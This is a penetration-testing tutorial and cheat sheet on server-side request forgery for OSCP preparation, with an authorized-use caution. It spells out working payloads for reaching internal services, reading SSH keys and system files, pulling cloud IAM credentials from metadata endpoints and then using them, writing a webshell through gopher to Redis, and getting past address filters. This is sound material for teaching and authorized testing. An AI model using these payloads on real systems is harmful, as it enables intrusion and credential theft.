# SSRF (Server-Side Request Forgery)

> Server-side request forgery: the target server makes HTTP (or other)
> protocol requests to a destination the attacker controls.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Filter Bypass](#5-filter-bypass)
- [6. Cloud Metadata](#6-cloud-metadata)
- [7. Chain Examples](#7-chain-examples)
- [8. Tools](#8-tools)
- [9. OSCP Notes](#9-oscp-notes)
- [10. Cheatsheet](#10-cheatsheet)
- [11. References](#11-references)

---

## 1. Overview

SSRF = attacker-controlled input reaches a server-side HTTP client
(or any URL/URI fetcher), letting the attacker direct the request.

**Impact chain:**

1. Reach internal-only services (admin panels, Jenkins, Kubernetes API).
2. Query cloud metadata (169.254.169.254) for IAM credentials.
3. Read local files via file:// scheme.
4. Achieve RCE through gopher:// to Redis, FastCGI, or other TCP services.

**Two flavors:**

| Flavor | Signal |
|--------|--------|
| Non-blind | Response body reflects the fetched resource |
| Blind | No response; must use out-of-band callback (interactsh, Burp Collaborator) |

**Common injection points:**

- URL parameters: ?url=, ?image=, ?fetch=, ?callback=
- POST body fields that accept URLs
- Webhook configs, PDF generators, screenshot services
- XML parsers (XXE-adjacent)
- Import/export features (URL-based import)

**On OSCP:** SSRF appears when there is a URL-fetching feature. Common
with internal Jenkins, admin panels, and metadata endpoints.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Non-destructive probe to attacker listener (interactsh) | [PROD-RISK] |
| Internal port scan via SSRF | [PROD-RISK] (SOC may see internal traffic) |
| Cloud metadata query | [PROD-RISK] (may trigger CloudTrail alerts) |
| file:// read of sensitive files | [PROD-NO] (data exfiltration) |
| gopher:// to Redis / FastCGI for RCE | [PROD-NO] |
| Cloud credential extraction and use | [PROD-NO] (account takeover) |

### 2.2 What NOT to do (production)

- Do NOT scan the internal network at scale via SSRF.
- Do NOT read /etc/shadow, cloud credentials, or DB dumps.
- Do NOT trigger gopher-based RCE without written approval.
- Do NOT use stolen cloud credentials to pivot.
- Do NOT leave the SSRF feature in a broken state (some fetches can crash the app).

### 2.3 Rate limiting

SSRF requests count against the target application, not your scanner. In
production, watch the target response time and back off if the app slows.

---

## 3. Detection

### 3.1 Common injection points

Look for parameters that accept URLs:

- ?url=http://..., ?image=..., ?fetch=..., ?webhook=...
- ?callback=..., ?redirect=..., ?next=...
- ?path=..., ?file=..., ?src=...
- JSON body: {"url": "http://..."}
- XML body: <url>http://...</url>
- Referer header, X-Forwarded-For (some apps fetch based on these)

### 3.2 Basic probe (external callback)

First, set up a listener:

```bash
interactsh-client
# copy the printed URL, e.g. xyz.oast.fun
```

Then send a request that makes the server fetch your listener:

```bash
curl 'http://target/fetch?url=http://xyz.oast.fun/test'
curl 'http://target/api/webhook' -H 'Content-Type: application/json' -d '{"url":"http://xyz.oast.fun/test"}'
```

**Expected output (interactsh):**

```text
[GET] received from target-ip on xyz.oast.fun
```

If you see a callback, the parameter is vulnerable to SSRF.

### 3.3 Non-blind test (internal target)

Point the parameter at an internal address and see if the response differs:

```bash
curl 'http://target/fetch?url=http://127.0.0.1:80/'
curl 'http://target/fetch?url=http://127.0.0.1:22/'
curl 'http://target/fetch?url=http://127.0.0.1:6379/'
```

Different response times or bodies for open vs closed ports = non-blind SSRF.

### 3.4 Blind SSRF with OOB

When no response is reflected, use an OOB listener and probe internal
addresses:

```bash
# interactsh detects DNS lookups to internal-style names
curl 'http://target/fetch?url=http://internal-service.xyz.oast.fun/'
```

DNS resolution of the attacker-controlled subdomain proves SSRF even when
HTTP is filtered.

---

## 4. Exploitation

### 4.1 Internal port scan

```bash
# Manual sweep
for p in 22 80 443 2375 3000 5000 5601 6379 8080 8081 8443 9000 9200 15672; do
    timeout 3 curl -s -o /dev/null -w "PORT: %{http_code}\\n" 'http://target/fetch?url=http://127.0.0.1:PORT'
done
```

Or automate with SSRFmap:

```bash
ssrfmap -r req.txt -p url --module portscan --lport 1234
```

### 4.2 Access internal services

Common internal targets reachable via SSRF:

- Jenkins: http://127.0.0.1:8080/script (Groovy RCE if unauth)
- Kubernetes API: https://kubernetes.default.svc
- Docker socket over HTTP: http://127.0.0.1:2375/containers/json
- Consul: http://127.0.0.1:8500/v1/catalog/services
- Admin panels on localhost only
- Elasticsearch: http://127.0.0.1:9200/_cat/indices
- Redis: http://127.0.0.1:6379/ (not HTTP, use gopher)

```bash
curl 'http://target/fetch?url=http://127.0.0.1:8080/manage'
curl 'http://target/fetch?url=http://127.0.0.1:2375/containers/json'
```

### 4.3 Local file read (file:// scheme)

When the fetcher accepts file://:

```bash
curl 'http://target/fetch?url=file:///etc/passwd'
curl 'http://target/fetch?url=file:///var/www/html/config.php'
curl 'http://target/fetch?url=file:///root/.ssh/id_rsa'
```

Some fetchers also support dict://, ftp://, gopher://.

### 4.4 Gopher to Redis RCE

Gopher speaks raw TCP. Use it to send RESP commands to Redis.

```text
Protocol:  gopher://[HOST]:[PORT]/_[url-encoded-tcp-payload]
```

Redis commands (each line ends with CRLF):

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET pwn [PHP webshell payload]
SAVE
```

URL-encode the whole thing after gopher://host:port/_

Automate with Gopherus:

```bash
gopherus --exploit redis
gopherus --exploit fastcgi
gopherus --exploit mysql
```

Full payloads for FastCGI, MySQL, SMTP, LDAP: see
[../07 Databases.md](../07%20Databases/README.md) (once published).

### 4.5 Cloud metadata (see section 6)

The single highest-impact SSRF chain: hit 169.254.169.254 for IAM creds.
Detailed endpoints in section 6.

---

## 5. Filter Bypass

### 5.1 Blocklist bypass

If 127.0.0.1, localhost, or 169.254.169.254 are blocked, try:

- Decimal IP: http://2130706433/ (= 127.0.0.1)
- Octal IP: http://0177.0.0.1/
- Hex IP: http://0x7f000001/
- Mixed: http://127.1/, http://127.0.1/
- Short forms: http://0/, http://127.1/
- IPv6: http://[::1]/, http://[::ffff:127.0.0.1]/
- Redirect: host a URL that 302s to 127.0.0.1

**DNS rebinding (allowlist bypass):**

Hostname resolves to attacker IP for the first request (allowlist check
passes), then to 127.0.0.1 on the second lookup.

- Public rebinding services: rbndr.us, lock.cmpxchg8b.com/rebinder.html
- Custom DNS server with 0 TTL
- Race depends on target fetch timing

### 5.2 URL parsing tricks

Different parsers read the same URL differently:

```text
http://allowed.com@127.0.0.1/          (userinfo trick)
http://127.0.0.1#allowed.com            (fragment)
http://127.0.0.1?.allowed.com           (query)
http://allowed.com%2f@127.0.0.1/        (encoded slash)
http://127.0.0.1%09.allowed.com/        (tab)
```

### 5.3 Redirect-based bypass

Point the SSRF at your server, which returns:

```text
HTTP/1.1 302 Found
Location: http://127.0.0.1:6379/
```

If the fetcher follows redirects, it reaches the internal target even if
the original hostname was allowlisted.

### 5.4 IPv6, decimal, octal, hex

```text
127.0.0.1        canonical
2130706433       decimal
0x7f000001       hex
0177.0.0.1       octal
127.1            short form
::1              IPv6
::ffff:127.0.0.1 IPv4-mapped IPv6
```

---

## 6. Cloud Metadata

Cloud VMs expose instance metadata at a link-local address. If SSRF can
reach it, attacker may obtain IAM credentials.

### 6.1 AWS IMDSv1

```bash
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]'
```

Response includes AccessKeyId, SecretAccessKey, Token.

### 6.2 AWS IMDSv2 (requires token)

IMDSv2 requires a PUT with X-aws-ec2-metadata-token-ttl-seconds header.
Plain SSRF cannot reach it, but gopher-based SSRF can:

```text
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a
```

### 6.3 GCP metadata

```bash
# Requires header: Metadata-Flavor: Google
curl 'http://target/fetch?url=http://169.254.169.254/computeMetadata/v1/'
curl 'http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
```

GCP usually blocks plain SSRF because the header is required. Gopher works.

### 6.4 Azure metadata

```bash
# Requires header: Metadata: true
curl 'http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'
```

### 6.5 Other providers

- DigitalOcean: http://169.254.169.254/metadata/v1/
- Alibaba: http://100.100.100.200/latest/meta-data/
- Oracle Cloud: http://169.254.169.254/opc/v1/instance/

> See also: future 03 Cloud/ directory (planned).

---

## 7. Chain Examples

### 7.1 SSRF - Redis - RCE

1. SSRF to http://127.0.0.1:6379/ (just to confirm open).
2. Gopher payload to write webshell (see section 4.4).
3. Access webshell via the web server.

### 7.2 SSRF - FastCGI - RCE

If PHP-FPM (port 9000) is exposed locally:

```bash
gopherus --exploit fastcgi
# follow the generated gopher:// payload
```

### 7.3 SSRF - internal Jenkins - RCE

1. SSRF to http://127.0.0.1:8080/manage (Jenkins unauth?).
2. If script console accessible: http://127.0.0.1:8080/script.
3. POST Groovy script to execute OS commands.

### 7.4 SSRF - cloud metadata - IAM takeover

1. SSRF to http://169.254.169.254/latest/meta-data/iam/security-credentials/.
2. Extract AccessKeyId, SecretAccessKey, Token.
3. Configure aws CLI with these creds.
4. aws sts get-caller-identity to confirm.
5. aws s3 ls, aws iam list-users, etc.

---

## 8. Tools

| Tool | Purpose |
|------|---------|
| interactsh-client | OOB DNS/HTTP listener |
| Burp Collaborator | OOB DNS/HTTP listener (built-in) |
| SSRFmap | Automated SSRF exploitation |
| Gopherus | Gopher payload generator (Redis, FastCGI, MySQL) |
| ffuf | Fuzz URL parameters for SSRF |
| curl | Manual SSRF probing |

Examples:

```bash
# SSRFmap
ssrfmap -r req.txt -p url --module portscan --lport 1234
ssrfmap -r req.txt -p url --module aws
ssrfmap -r req.txt -p url --module redis --lhost LHOST --lport 4444

# Gopherus
gopherus --exploit redis

# interactsh
interactsh-client
```

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the SSRF request and the reflected internal response.
> - Screenshot the internal port scan results if they identify the foothold.
> - Screenshot cloud metadata retrieval only if it directly leads to credentials
>   used for lateral movement or privesc.
> - Screenshot the final RCE (webshell, Groovy console, etc.).
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 10. Cheatsheet

```bash
# Basic probe
curl 'http://target/fetch?url=http://xyz.oast.fun/test'

# Internal targets
curl 'http://target/fetch?url=http://127.0.0.1:8080/manage'
curl 'http://target/fetch?url=http://127.0.0.1:2375/containers/json'
curl 'http://target/fetch?url=file:///etc/passwd'

# Cloud metadata
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Bypass variants
curl 'http://target/fetch?url=http://2130706433/'
curl 'http://target/fetch?url=http://127.1/'
curl 'http://target/fetch?url=http://[::1]/'
```

---

## 11. References

- OWASP SSRF - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PortSwigger SSRF - https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings SSRF - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- SSRFmap - https://github.com/swisskyrepo/SSRFmap
- Gopherus - https://github.com/tarunkant/Gopherus
- interactsh - https://github.com/projectdiscovery/interactsh

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../07 Databases.md](../07%20Databases/README.md), [../../03 API/02 REST.md](../../03%20API/02%20REST.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
